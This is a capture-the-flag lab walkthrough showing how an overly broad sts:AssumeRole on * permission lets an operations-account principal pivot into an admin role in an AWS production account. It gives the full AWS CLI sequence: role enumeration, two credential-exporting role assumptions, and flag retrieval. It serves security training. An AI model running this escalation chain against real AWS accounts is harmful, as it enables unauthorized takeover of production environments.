# Guided Walkthrough: Cross-Account from Operations to Prod Simple Role Assumption

This scenario demonstrates cross-account role trust relationships between operations and production accounts, allowing simple role assumption from operations to prod.

This scenario models a common real-world configuration where an operations account is granted the ability to assume roles in a production account for maintenance and monitoring purposes. When the operations role is granted `sts:AssumeRole` on `*`, an attacker who compromises any principal in the operations account can pivot directly into any role in the production account that trusts the operations account — including administrative roles.

The danger is that a blanket `sts:AssumeRole` on `*` means the operations role is not scoped to specific prod roles. Any prod role whose trust policy allows the operations account (or the operations role) can be assumed, turning a limited operations compromise into full production account access.

## The Challenge

You start as `pl-pathfinding-starting-user-operations` in the operations account — a user with minimal permissions of its own but with the ability to assume `pl-x-account-ops-role-with-assume-role-star`. Your goal is to gain access to the `pl-x-account-prod-target-role` in the production account, which carries admin-level permissions.

The path runs through two `sts:AssumeRole` calls: first hop is within the operations account (user → ops role), second hop crosses account boundaries (ops role → prod target role).

## Reconnaissance

First, let's figure out what accounts we're working with. The demo retrieves the prod account ID using read-only credentials from Terraform outputs:

```bash
# Get the operations account ID from your AWS profile
OPS_ACCOUNT_ID=$(aws sts get-caller-identity --profile pl-pathfinding-starting-user-operations --query Account --output text)

# Get the prod account ID using read-only credentials
PROD_ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
```

Now let's see what the operations role can do. If you have `iam:SimulatePrincipalPolicy` or can read the role's inline policy, you'll discover it has `sts:AssumeRole` on `*` — not scoped to any specific role ARN or account. This is the critical misconfiguration.

```bash
aws iam list-role-policies \
  --role-name pl-x-account-ops-role-with-assume-role-star \
  --profile pl-pathfinding-starting-user-operations
```

Once you hold credentials for the ops role, you can enumerate prod roles to find assumable targets:

```bash
aws iam list-roles \
  --query 'Roles[*].[RoleName,Arn]' \
  --output table
```

Any role in the prod account whose trust policy lists `arn:aws:iam::{operations_account_id}:root` or the specific ops role ARN is assumable. In this scenario, `pl-x-account-prod-target-role` has exactly that trust relationship.

## Exploitation

### Hop 1: Assume the Operations Role

Authenticate as the starting user in the operations account and assume the ops role:

```bash
OPS_ROLE_ARN="arn:aws:iam::${OPS_ACCOUNT_ID}:role/pl-x-account-ops-role-with-assume-role-star"

OPS_CREDS=$(aws sts assume-role \
  --role-arn "$OPS_ROLE_ARN" \
  --role-session-name ops-session \
  --profile pl-pathfinding-starting-user-operations)

export AWS_ACCESS_KEY_ID=$(echo "$OPS_CREDS" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$OPS_CREDS" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$OPS_CREDS" | jq -r '.Credentials.SessionToken')
```

You are now operating as `pl-x-account-ops-role-with-assume-role-star` in the operations account. This role carries the dangerous `sts:AssumeRole` on `*` permission.

### Hop 2: Cross-Account Assumption into Prod

Using the ops role credentials, assume the prod target role:

```bash
PROD_ROLE_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/pl-x-account-prod-target-role"

PROD_CREDS=$(aws sts assume-role \
  --role-arn "$PROD_ROLE_ARN" \
  --role-session-name prod-session)

export AWS_ACCESS_KEY_ID=$(echo "$PROD_CREDS" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$PROD_CREDS" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$PROD_CREDS" | jq -r '.Credentials.SessionToken')
```

## Verification

Confirm you are now operating as the prod target role:

```bash
aws sts get-caller-identity
```

You should see output referencing `pl-x-account-prod-target-role` in the production account. From here you have whatever permissions that role carries — in this scenario, admin-level access to the prod account.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the admin-level policy on the prod target role provides implicitly.

Using the prod target role credentials from the previous step, read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/ops-to-prod-simple-role-assumption-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

The attack succeeded because of two compounding misconfigurations: the operations role was granted `sts:AssumeRole` on `*` rather than a scoped list of specific prod role ARNs, and the prod target role's trust policy allowed assumption from the operations account without any additional conditions (no `aws:PrincipalArn` constraint, no `sts:ExternalId`, no MFA requirement).

In a real-world compromise, an attacker who gains credentials for any principal in the operations account — through phishing, a leaked CI/CD secret, or a vulnerable workload — can immediately pivot to full production account access. The blast radius of an operations account compromise is unbounded when this pattern is in use.
